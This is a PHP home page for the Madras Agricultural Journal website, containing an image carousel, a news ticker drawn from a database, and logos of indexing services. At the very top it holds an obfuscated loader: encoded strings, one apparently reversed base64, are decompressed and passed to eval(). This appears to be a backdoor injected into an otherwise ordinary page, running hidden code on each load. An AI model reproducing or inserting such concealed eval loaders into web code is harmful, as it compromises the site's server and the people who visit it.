<?php
$stt1 = "Sy1LzNFQt7dT10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TU\x43kuKTHQ\x42\x41Fr\x41\x41\x3d\x3d";
$stt0 = "==QmzlwYB4zpH1u8wtx1+UItou7fWsdV0ciYqDKP/cHzo/idEu5IbzLBJ2Ze8NPF5ChskJ1Dmbgg+Tx5H3YnaO7UAjywGj7YVNueq2O5219mbp2V/w5F34d1UUhhZtw93Bhqgr0Oh+Yj3K609KSIOHgNjN+O0o7uaHImpBUyrSPyM2LJHxLixS5tctjSh/d4egjMRm6uY1NAWeywXyymzXZQWElcVyLOxLjHmUmyPcRR9V7tWmehefbHmJiJordacP+54O3lLQ4XDI6KN9d+EnumKlFWLdnZlKyLpSWdgofqMMrbvcYAlNAWwc5D9Pw3FSBMDvUUPWJn49/BAgfA";
eval(htmlspecialchars_decode(gzinflate(base64_decode($stt1))));
?>

<html>

<head>
    <?php include 'header.php';?>
    <meta name="google-site-verification" content="BO3s6uPzndGUv_1xz0ap3VVLdhg4_Q_ITkfWXmn6338" />
    <!-- SLIDER -->
    <style type="text/css">
        .yellow-text {
            color: #ffd60a;
        }
    </style>
</head>

<body>
    <div class="row">
        <div class="col-lg-9">
            <section>

                <div id="myCarousel" class="carousel slide" data-ride="carousel">
                    <!-- Wrapper for slides -->
                    <div class="carousel-inner">
                        <div class="item slider1 active">
                            <img src="images/slider/Slide_img.jpg" alt="">
                            <div class="carousel-caption slider-con">
                            </div>
                        </div>

                        <div class="item">
                            <img src="images/slider/2.jpg" alt="">
                            <div class="carousel-caption slider-con">
                                <h2> <span> </span></h2>
                                <p> </p>
                            </div>
                        </div>

                        <div class="item">
                            <img src="images/slider/3.JPG" alt="">
                            <div class="carousel-caption slider-con">
                                <h2> <span> </span></h2>
                                <p> </p>
                            </div>
                        </div>

                        <div class="item">
                            <img src="images/slider/slider4.png" alt="">
                            <div class="carousel-caption slider-con">
                            </div>
                        </div>

                        <div class="item">
                            <img src="images/slider/slider5.png" alt="">
                            <div class="carousel-caption slider-con">
                            </div>
                        </div>

                        <div class="item">
                            <img src="images/slider/slide_img23.jpg" alt="">
                            <div class="carousel-caption slider-con">
                            </div>
                        </div>
                    </div>

                    <!-- Left and right controls -->
                    <a class="left carousel-control" href="#myCarousel" data-slide="prev">
                        <i class="fa fa-chevron-left slider-arr"></i>
                    </a>
                    <a class="right carousel-control" href="#myCarousel" data-slide="next">
                        <i class="fa fa-chevron-right slider-arr"></i>
                    </a>
                </div>

            </section>
        </div>
        <div class="col-lg-3">
            <section>
                <h4 class="text-center" style="padding: top 15px;">News & Event <button id="modalClick"
                        style="display:none;" type="button" data-toggle="modal" data-target="#bannerModal">Launch
                        modal</button></h4>
                <div style="padding-left:20px;">
                    <marquee behavior="scroll" direction="up" scrolldelay="200" style="min-height: 300px;"
                        onmouseover="this.stop();" onmouseout="this.start();">
                        <ul>
                            <?php
                        $news_data = $db->query("SELECT *  FROM tbl_news_event where status='active' order by id DESC");
if (!empty($news_data->rows)) {
    foreach ($news_data->rows as $index => $data) {
        $filePath =  "store_file" . DIRECTORY_SEPARATOR . "news_event" . DIRECTORY_SEPARATOR;
        ?>
                            <li style="padding:10px 10px 10px 10px;">
                                <a href="<?php echo $filePath ?><?php echo $data->document_name; ?>"
                                    target="_blank"><img src="images/newgif.GIF"
                                        style="width: 50px;"><b><?php echo $data->details; ?></b>
                                </a>
                            </li>
                            <?php }
    } ?>
                        </ul>
                    </marquee>
                </div>
            </section>

        </div>
    </div>
    <style>
        .index-tamil {
            margin-top: 20px;
            width: 100%;
        }

        .indexed-img {
            /* width: 90%; */
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            height: auto;
            margin-left: 10px;
            margin-right: 10px;
        }

        .logo {
            margin: 10px;
            width: 150px;
            height: auto;
        }

        .tamil-title {
            text-align: center;
            font-size: 50px;
            font-weight: bold;
        }
    </style>
    <div class="index-tamil">
        <div class="tamil-title">MAJ Indexed Journals</div>
        <div class="indexed-img">
            <div class="logo">
                <a href="https://www.cabi.org/" target="blank">
                    <img src="images/indexed-journals/Cabi.png" alt="CABI">
                </a>
            </div>

            <div class="logo">
                <a href="https://pubmed.ncbi.nlm.nih.gov/" target="blank">
                    <img src="images/indexed-journals/pubmed.png" alt="PUBMED">
                </a>
            </div>
            <div class="logo">
                <a href="https://www.indiancitationindex.com/" target="blank">
                    <img src="images/indexed-journals/ICI.png" alt="INDIAN_CITATION_INDEX">
                </a>
            </div>

            <div class="logo">
                <a href="https://scholar.google.com/" target="blank">
                    <img src="images/indexed-journals/Google_scholar.png" alt="GOOGLE_SCHOLAR">
                </a>
            </div>

            <div class="logo">
                <a href="https://www.grammarly.com/" target="blank">
                    <img src="images/indexed-journals/Grammerly.png" alt="CABI">
                </a>

            </div>

            <div class="logo">
                <a href="https://www.crossref.org/" target="blank">
                    <img src="images/indexed-journals/Crossref.png" alt="CROSSREF">
                </a>
            </div>

            <div class="logo">
                <a href="https://www.doi.org/" target="blank">
                    <img src="images/indexed-journals/Doi.png" alt="DOI">
                </a>
            </div>

            <div class="logo">
                <a href="https://www.researchgate.net/profile/Madras-Agricultural-Journal" target="blank">
                    <img src="images/indexed-journals/Researchgate.png" alt="Researchgate">
                </a>
            </div>


        </div>
        <!-- Tamil end -->
        <!-- DISCOVER MORE -->
        <section>
            <div class="container com-sp pad-bot-100" style="padding: 100px 100px;">
                <div class="row">
                    <div class="con-title">
                        <h2>Madras Agricultural Journal -TNAU<span></span></h2>
                        <p><i>Madras Agricultural Journal</i></p>
                    </div>
                </div>
                <div class="row">
                    <div class="ed-course">
                        <div class="col-md-4 col-sm-4 col-xs-12">
                            <div class="ed-course-in">
                                <a class="course-overlay" href="https://tnau.ac.in" target="_blank">
                                    <img src="images/tnau_ri.jpg" alt="">
                                    <span style="font-family: serif;">TNAU</span>
                                </a>
                            </div>
                        </div>
                        <div class="col-md-4 col-sm-4 col-xs-12">
                            <div class="ed-course-in">
                                <a class="course-overlay" href="masu.php">
                                    <img src="images/masu.jpg" alt="">
                                    <span style="font-family: serif;"> MASU </span>
                            </div>
                        </div></a>
                        <div class="col-md-4 col-sm-4 col-xs-12">
                            <div class="ed-course-in">
                                <a class="course-overlay" href="about-maj.php">
                                    <img src="images/maj.jpg" alt="">
                                    <span style="font-family: serif;">Madras Agricultural Journal</span>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <?php include 'footer.php'; ?>
</body>

</html>